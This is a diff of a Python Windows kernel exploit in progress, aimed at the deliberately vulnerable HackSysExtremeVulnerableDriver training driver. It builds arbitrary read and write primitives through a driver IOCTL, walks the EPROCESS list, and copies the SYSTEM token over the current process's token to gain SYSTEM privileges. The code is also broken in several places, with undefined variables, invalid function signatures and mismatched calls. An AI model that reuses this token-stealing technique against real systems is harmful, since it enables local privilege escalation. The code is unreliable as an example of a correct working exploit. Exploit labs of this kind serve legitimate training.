@@ -82,7 +82,7 @@ if dwStatus != STATUS_SUCCESS:
 
 
 ########################################## KERNEL BASE ################################################
-def getkernelBase(driver_handle, what=None, where=None):
+def getkernelBase(driver, what=None, where=None):
     print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
     sys_info = create_string_buffer(0)
     sys_info_len = c_ulong(0)
@@ -157,8 +157,16 @@ def get_PsISP_kernel_address(kernel_base):
     return system_kernel_base_pointer
 
 ################################################### WRITE ###########################################################
-def writePrimitive(driver_handle, what=None, where=None):
-    what_addr = 0x000000001a001000
+def writePrimitive(driver, what_addr=None, where=None):
+    
+    IoControlCode = 0x0022200B
+    InputBuffer = c_void_p(0x000000001a000000)
+    InputBufferLength = 0x10
+    OutputBuffer = c_void_p(0)
+    OutputBufferLength = 0
+    dwBytesReturned = c_ulong()
+    lpBytesReturned = byref(dwBytesReturned)
+
     # Write the what value to what_addr
     data = struct.pack('<Q', what)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
@@ -176,7 +184,29 @@ def writePrimitive(driver_handle, what=None, where=None):
         print ('Something went wrong while writing to memory in the packing section'
                , 'e')
         sys.exit()
-        
+    
+    print 'Value before DeviceIoControl: %08x' \
+        % cast(0x000000001a000000, POINTER(c_ulonglong))[0]
+    
+    triggerIOCTL = kernel32.DeviceIoControl(
+        driver,
+        IoControlCode,
+        InputBuffer,
+        InputBufferLength,
+        OutputBuffer,
+        OutputBufferLength,
+        lpBytesReturned,
+        NULL,
+        )
+    
+    print 'Value after: %08x' % cast(0x000000001a000000,
+            POINTER(c_ulonglong))[0]
+    return triggerIOCTL
+################################################### READ ###########################################################
+                                 #What is it you want to write? #We are writing it back to userland memory.
+def readPrimitive(driver, what_addr=None, user_addr):
+
+    #We've created a block of memory at the top of userland via dwStatus
     IoControlCode = 0x0022200B
     InputBuffer = c_void_p(0x000000001a000000)
     InputBufferLength = 0x10
@@ -184,9 +214,13 @@ def writePrimitive(driver_handle, what=None, where=None):
     OutputBufferLength = 0
     dwBytesReturned = c_ulong()
     lpBytesReturned = byref(dwBytesReturned)
-    
+                                                            #THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
+    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where=None)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
+            0x000000001a000000, data, len(data), byref(written))
+
     print 'Value before DeviceIoControl: %08x' \
-        % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+        % cast(user_addr, POINTER(c_ulonglong))[0]
     
     triggerIOCTL = kernel32.DeviceIoControl(
         driver,
@@ -199,44 +233,13 @@ def writePrimitive(driver_handle, what=None, where=None):
         NULL,
         )
     
-    print 'Value after: %08x' % cast(0x000000001a002000,
+    print 'Value after: %08x' % cast(user_addr,
             POINTER(c_ulonglong))[0]
-    return triggerIOCTL
-################################################### READ ###########################################################
-def readPrimitive(driver_handle, system_kernel_base_pointer, where=None):
-
-    #We've created a block of memory at the top of userland via dwStatus
-    what_addr = system_kernel_base_pointer + 0x358 #system token address
-    where = 0x000000001a001000
-
-    IoControlCode = 0x0022200B
-    InputBuffer = c_void_p(0x000000001a001000)
-    InputBufferLength = 0x10
-    OutputBuffer = c_void_p(0)
-    OutputBufferLength = 0
-    dwBytesReturned = c_ulong()
-    lpBytesReturned = byref(dwBytesReturned)
-    
-    print 'Value before DeviceIoControl: %08x' \
-        % cast(where, POINTER(c_ulonglong))[0]
-    
-    triggerIOCTL = kernel32.DeviceIoControl(
-        driver,
-        IoControlCode,
-        InputBuffer,
-        InputBufferLength,
-        OutputBuffer,
-        OutputBufferLength,
-        lpBytesReturned,
-        NULL,
-        )
-    
-    print 'Value after: %08x' % cast(0x000000001a001000,
-            POINTER(c_ulonglong))[0]
-    read_value = cast(0x000000001a001000,
+    read_value = cast(user_addr,
             POINTER(c_ulonglong))[0]
     return triggerIOCTL
     return read_value
+
 ############################## GET CURRENT PROCESS TOKEN OFFSET ################################
 unique_process_id_offset = 0x2e0
 active_process_links_offset = 0x2e8
@@ -245,7 +248,7 @@ token_offset = 0x358
 def get_current_eprocess(system_kernel_base_pointer):
     """ Returns ptr to Current EPROCESS structure """
     flink = c_ulonglong()
-    readPrimitive(system_kernel_base_pointer + active_process_links_offset, byref(flink), sizeof(flink));    
+    readPrimitive(driver, system_kernel_base_pointer + active_process_links_offset, user_addr);    
     
     current_pEPROCESS = 0
     while (1):
@@ -255,24 +258,24 @@ def get_current_eprocess(system_kernel_base_pointer):
         system_kernel_base_pointer = flink.value - unique_process_id_offset - 0x8
         
         # Get PID
-        readPri(system_kernel_base_pointer + unique_process_id_offset, byref(unique_process_id), sizeof(unique_process_id));   
+        readPrimitive(driver, system_kernel_base_pointer + unique_process_id_offset, user_addr);   
         
         # Check if we're in the current process
         if (os.getpid() == unique_process_id.value):
             current_pEPROCESS = system_kernel_base_pointer
             break
             
-        read_virtual(system_kernel_base_pointer + active_process_links_offset, byref(flink), sizeof(flink));    
+        readPrimitive(driver, system_kernel_base_pointer + active_process_links_offset, user_addr);    
         
         # If next same as last, we've reached the end
         if (system_kernel_base_pointer == flink.value - unique_process_id_offset - 0x8):
             break
         
-    return current_pEPROCESS
+    return currentprocessBase 
 
 ########################################### MAIN ###############################################
 def executeOverwrite():
-    driver_handle = kernel32.CreateFileA(
+    driver = kernel32.CreateFileA(
         '\\\\.\\HackSysExtremeVulnerableDriver',
         GENERIC_READ | GENERIC_WRITE,
         0,
@@ -281,14 +284,29 @@ def executeOverwrite():
         0,
         None,
         )
-    if not driver_handle or driver_handle == -0x01:
+    if not driver or driver == -0x01:
         print '[!] Driver handle not found :(\n'
         sys.exit()
     else:
         print '[X] Got handle to the driver.\n'
 
-        img_name, kernel_base = getkernelBase(driver_handle)
+        #Get kernel base.
+        img_name, kernel_base = getkernelBase(driver)
+        #Get system process base.
         system_kernel_base_pointer = get_PsISP_kernel_address(kernel_base)
-        read_value = readPrimitive(driver_handle, system_kernel_base_pointer)
+        #Read the value of that token.
+        read_value = readPrimitive(driver, system_kernel_base_pointer)
+        #Walk the process list for wherever our process is in memory.
+        currentprocessBase = get_current_eprocess(system_kernel_base_pointer)
+
+        #Define our expected offsets for this version of Windows.
+        system_token = system_kernel_base_pointer + 0x358
+        user_addr = 0x000000001a000000
+        current_token = currentprocessBase + 0x358
+
+        #Write the system_token over our current_token for SYSTEM privileges.
+        writePrimitive(system_token, current_token)
+
 ############################################ RUN ################################################
+
 executeOverwrite()
